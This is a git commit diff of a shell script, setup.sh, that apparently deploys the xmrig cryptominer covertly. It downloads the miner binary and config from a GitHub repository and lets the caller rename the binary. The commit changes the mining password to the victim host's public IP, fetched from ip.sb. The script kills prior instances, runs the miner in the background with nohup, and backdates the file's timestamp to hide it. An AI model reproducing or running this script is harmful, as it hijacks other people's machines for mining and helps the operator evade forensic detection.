1a34b1a90e1469bf2f8312217f2aac992ceb18f8
blackUser623 <84452942+blackUser623@users.noreply.github.com>
2021-05-19 23:15:58 +0800

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -2,18 +2,21 @@
 
 CONFIG="https://raw.githubusercontent.com/blackUser623/xm/main/config.json"
 TERMINAL="https://raw.githubusercontent.com/blackUser623/xm/main/xmrig"
-PASS=$(hostname)
+PASS=$(curl -s ip.sb)
 DIR="$1"
 PATH="/usr/bin/"
 FILE="$2"
+str=$"/n"
 
 wget ${CONFIG} -O ${DIR}config.json
 wget ${TERMINAL} -O ${DIR}${FILE}
 
 sed -i "s/xxxxx/${PASS}/g" ${DIR}config.json
 
-ps -aux |grep "\./${FILE}" | awk '{print $2}' |xargs kill -9
+ps -aux | grep "\./${FILE}" | awk '{print $2}' | xargs kill -9
 cd ${DIR}
 chmod 755 ./${FILE}
-nohup ./${FILE}
+nohup ./${FILE} &
+sstr=$(echo -e ${str})
+echo ${sstr}
 touch -ct 202012151421 ${FILE}
